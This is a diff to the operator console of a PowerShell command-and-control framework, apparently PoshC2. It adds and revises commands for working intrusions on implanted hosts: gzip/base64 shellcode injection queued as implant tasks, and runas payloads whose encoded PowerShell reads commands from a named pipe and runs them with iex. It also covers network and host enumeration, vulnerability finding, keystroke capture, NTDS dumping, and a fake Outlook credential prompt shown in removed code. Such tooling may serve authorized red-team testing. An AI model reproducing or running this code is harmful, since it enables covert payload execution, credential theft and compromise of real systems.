+    $gzipStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
+    $gzipStream.Write( $byteArray, 0, $byteArray.Length )
+    $gzipStream.Close()
+    $output.Close()
+    [Convert]::ToBase64String($output.ToArray())
+}
+
+
+function Get-DecompressedByteArray ([byte[]] $byteArray) {
+    $input = New-Object System.IO.MemoryStream( , $byteArray )
+	$output = New-Object System.IO.MemoryStream
+    $gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
+	$gzipStream.CopyTo( $output )
+    $gzipStream.Close()
+	$input.Close()
+	[byte[]] $byteOutArray = $output.ToArray()
+    $byteOutArray
+
+}
 
 # run startup function
 startup
@@ -1289,6 +1428,22 @@ param
                    $params = Get-FileName -Dir "$($PoshPath)\Modules"
                    $pscommand = "$($pscommand) $($params)"
                 }
+            }
+            if ($pscommand.ToLower() -eq 'inject-shellcode')
+            {
+                CheckModuleLoaded "Inject-Shellcode.ps1" $psrandomuri
+                $fileName = Get-FileName -Dir "$FolderPath\payloads\"
+                $ScriptBytes = Get-Content "$fileName" -Encoding Byte
+                $base64Stream = Get-CompressedByteArray -byteArray $ScriptBytes
+                $Params = Read-Host "Any parameters?"
+
+                $query = "INSERT INTO NewTasks (RandomURI, Command) VALUES (@RandomURI, @Command)"
+                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
+                    RandomURI = $psrandomuri
+                    Command   = '$t="'+$base64Stream+'";$g = New-Object System.IO.Compression.GzipStream (New-Object System.IO.MemoryStream(,[Convert]::FromBase64String($t))), ([IO.Compression.CompressionMode]::Decompress); $g.CopyTo(($o = New-Object System.IO.MemoryStream));'
+                } | Out-Null
+
+                $pscommand = "Inject-Shellcode -Shellcode (`$o.ToArray()) $Params"	
             }
             if ($pscommand)
             { 
@@ -1613,7 +1768,8 @@ param
             }
             if ($pscommand.ToLower().StartsWith('migrate'))
             {
-                $pscommand = $pscommand -replace 'migrate',''
+                $pscommand = $pscommand -replace 'migrate ',''
+                $pscommand = $pscommand -replace 'migrate',''                
                 $pscommand = IEX "migrate $psrandomuri `"$pscommand`""
             }
 
@@ -1740,6 +1896,10 @@ param
             { 
                 CheckModuleLoaded "Get-Keystrokes.ps1" $psrandomuri    
             }
+            if ($pscommand.ToLower().StartsWith('arpscan'))
+            { 
+                CheckModuleLoaded "Invoke-Arpscan.ps1" $psrandomuri
+            }
             if ($pscommand.ToLower().StartsWith('portscan'))
             { 
                 CheckModuleLoaded "PortScanner.ps1" $psrandomuri
@@ -1763,6 +1923,14 @@ param
             if ($pscommand.tolower().startswith('invoke-wmicommand'))
             {
                 CheckModuleLoaded "Invoke-WMICommand.ps1" $psrandomuri
+            }
+            if ($pscommand.tolower().startswith('invoke-hostenum'))
+            {
+                CheckModuleLoaded "HostEnum.ps1" $psrandomuri
+            }
+            if ($pscommand.tolower().startswith('find-allvulns'))
+            {
+                CheckModuleLoaded "sherlock.ps1" $psrandomuri
             }
             if ($pscommand.tolower().startswith('dump-ntds'))
             {
@@ -1803,6 +1971,10 @@ param
             if ($pscommand.tolower().startswith('get-computerinfo'))
             {
                 CheckModuleLoaded "Get-ComputerInfo.ps1" $psrandomuri
+            }
+            if ($pscommand.tolower().startswith('get-userinfo'))
+            {
+                CheckModuleLoaded "Get-UserInfo.ps1" $psrandomuri
             }
             if ($pscommand.tolower().startswith('sharpsocks'))
             {
@@ -1867,10 +2039,12 @@ param
             if ($pscommand.ToLower().StartsWith('invoke-runaspayload'))
             { 
                 CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
-                CheckModuleLoaded "invoke-runaspayload.ps1" $psrandomuri
+                CheckModuleLoaded "Invoke-RunAs.ps1" $psrandomuri
                 $pscommand = $pscommand -replace 'invoke-runaspayload', ''
-                $pscommand = "invoke-runaspayload $($pscommand)"
-                
+                $psCommandBase = "add-Type -assembly System.Core; `$pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMS'); `$pi.Connect(); `$pr = new-object System.IO.StreamReader(`$pi); iex `$pr.ReadLine();"
+                $bytes = [System.Text.Encoding]::Unicode.GetBytes($psCommandBase)
+                $encodedCommand= [Convert]::ToBase64String($bytes)
+                $pscommand = "invoke-runas $($pscommand) -command C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -Args `" -e $encodedCommand`""
             }     
             if ($pscommand.ToLower().StartsWith('invoke-runasproxypayload'))
             { 
@@ -1883,18 +2057,40 @@ param
                     Command   = '$proxypayload = "'+$proxypayload+'"'
                 } | Out-Null
                 CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
-                CheckModuleLoaded "invoke-runasproxypayload.ps1" $psrandomuri
+                CheckModuleLoaded "Invoke-RunAs.ps1" $psrandomuri
                 $pscommand = $pscommand -replace 'invoke-runasproxypayload', ''
-                $pscommand = "invoke-runasproxypayload $($pscommand)"
+                $psCommandBase = "add-Type -assembly System.Core; `$pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMSProxy'); `$pi.Connect(); `$pr = new-object System.IO.StreamReader(`$pi); iex `$pr.ReadLine();"
+                $bytes = [System.Text.Encoding]::Unicode.GetBytes($psCommandBase)
+                $encodedCommand= [Convert]::ToBase64String($bytes)
+                $pscommand = "invoke-runas $($pscommand) -command C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -Args `" -e $encodedCommand`""
                 } else {
                 write-host "Need to run CreateProxyPayload first"
                 $pscommand = $null
                 }
             }
-            if ($pscommand.ToLower().StartsWith('get-proxy')) 
-            {
-                $pscommand = 'Get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"'
-            }
+            if ($pscommand.ToLower().StartsWith('invoke-runasdaisypayload'))
+            { 
+                $name = Read-Host "Name"
+                if (Test-Path "$FolderPath\payloads\$($name).bat"){
+                    $daisypayload = Get-Content -Path "$FolderPath\payloads\$($name).bat"  
+                    $query = "INSERT INTO NewTasks (RandomURI, Command)
+                    VALUES (@RandomURI, @Command)"
+                    Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
+                        RandomURI = $psrandomuri
+                        Command   = '$daisypayload = "'+$daisypayload+'"'
+                    } | Out-Null
+                    CheckModuleLoaded "NamedPipeDaisy.ps1" $psrandomuri
+                    CheckModuleLoaded "Invoke-RunAs.ps1" $psrandomuri
+                    $pscommand = $pscommand -replace 'invoke-runasdaisypayload', ''
+                    $psCommandBase = "add-Type -assembly System.Core; `$pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMSDaisy'); `$pi.Connect(); `$pr = new-object System.IO.StreamReader(`$pi); iex `$pr.ReadLine();"
+                    $bytes = [System.Text.Encoding]::Unicode.GetBytes($psCommandBase)
+                    $encodedCommand= [Convert]::ToBase64String($bytes)
+                    $pscommand = "invoke-runas $($pscommand) -command C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -Args `" -e $encodedCommand`""
+                } else {
+                    write-host "Need to run Invoke-DaisyChain first"
+                    $pscommand = $null
+                }
+            }           
             if ($pscommand.ToLower().StartsWith('createmacropayload')) 
             {
                 $pscommand|Invoke-Expression
@@ -1923,12 +2119,12 @@ param
             }
             if ($pscommand -eq 'cred-popper') 
             {
-                $pscommand = '$ps = $Host.ui.PromptForCredential("Outlook requires your credentials","Please enter your active directory logon details:","$env:userdomain\$env:username",""); $user = $ps.GetNetworkCredential().username; $domain = $ps.GetNetworkCredential().domain; $pass = $ps.GetNetworkCredential().password; echo "`nDomain: $domain `nUsername: $user `nPassword: $pass `n"'
-                write-host "This will stall the implant until the user either enter's their credentials or cancel's the popup window"
+                CheckModuleLoaded "Cred-Popper.ps1" $psrandomuri
             }
-            if (($pscommand.ToLower().StartsWith('sleep')) -or ($pscommand.ToLower().StartsWith('beacon'))-or ($pscommand.ToLower().StartsWith('set-beacon'))) 
+            if (($pscommand.ToLower().StartsWith('sleep')) -or ($pscommand.ToLower().StartsWith('beacon')) -or ($pscommand.ToLower().StartsWith('set-beacon')) -or ($pscommand.ToLower().StartsWith('setbeacon'))) 
             {
                 $pscommand = $pscommand -replace 'set-beacon ', ''
+                $pscommand = $pscommand -replace 'setbeacon ', ''
                 $pscommand = $pscommand -replace 'sleep ', ''
                 $pscommand = $pscommand -replace 'beacon ', ''
                 $sleeptime = $pscommand
@@ -1954,29 +2150,6 @@ param
                     Sleep = $newsleep
                     RandomURI = $psrandomuri
                 } | Out-Null
-            }
-            if (($pscommand.ToLower().StartsWith('turtle')) -or ($pscommand.ToLower().StartsWith('start-sleep'))) 
-            {
-                $pscommand = $pscommand -replace 'start-sleep ', ''
-                $pscommand = $pscommand -replace 'turtle ', ''
-                $sleeptime = $pscommand
-                if ($sleeptime.ToLower().Contains('m')) { 
-                    $sleeptime = $sleeptime -replace 'm', ''
-                    [int]$newsleep = $sleeptime 
-                    [int]$newsleep = $newsleep * 60
-                }
-                elseif ($sleeptime.ToLower().Contains('h')) { 
-                    $sleeptime = $sleeptime -replace 'h', ''
-                    [int]$newsleep1 = $sleeptime 
-                    [int]$newsleep2 = $newsleep1 * 60
-                    [int]$newsleep = $newsleep2 * 60
-                }
-                elseif ($sleeptime.ToLower().Contains('s')) { 
-                    $newsleep = $sleeptime -replace 's', ''
-                } else {
-                    $newsleep = $sleeptime
-                }
-                $pscommand = 'Start-Sleep '+$newsleep
             }
             if ($pscommand -eq 'invoke-ms16-032')
             { 
@@ -2126,8 +2299,13 @@ while($true)
             elseif ($global:command -eq 'help') 
             {
                 print-help
+            }
+            elseif ($global:command.ToLower().StartsWith('help')) 
+            {
+                $global:command = $global:command -replace 'help ',''
+                print-help $global:command
             } 
-            elseif ($global:command -eq '?') 
+            elseif ($global:command -eq '?')  
             {
                 print-help
             }
@@ -2160,11 +2338,16 @@ while($true)
             elseif ($global:command -eq 'help') 
             {
                 print-help
+            }
+            elseif ($global:command.ToLower().StartsWith('help')) 
+            {
+                $global:command = $global:command -replace 'help ',''
+                print-help $global:command
             } 
-            elseif ($global:command -eq '?') 
+            elseif ($global:command -eq '?')  
             {
                 print-help
-            } 
+            }
             else 
             {
                 $global:implantid.split(",")| foreach {
@@ -2193,11 +2376,16 @@ while($true)
             elseif ($global:command -eq 'help') 
             {
                 print-help
+            }
+            elseif ($global:command.ToLower().StartsWith('help')) 
+            {
+                $global:command = $global:command -replace 'help ',''
+                print-help $global:command
             } 
-            elseif ($global:command -eq '?') 
+            elseif ($global:command -eq '?')  
             {
                 print-help
-            } 
+            }
             else 
             {
                 #write-host $global:command $global:randomuri
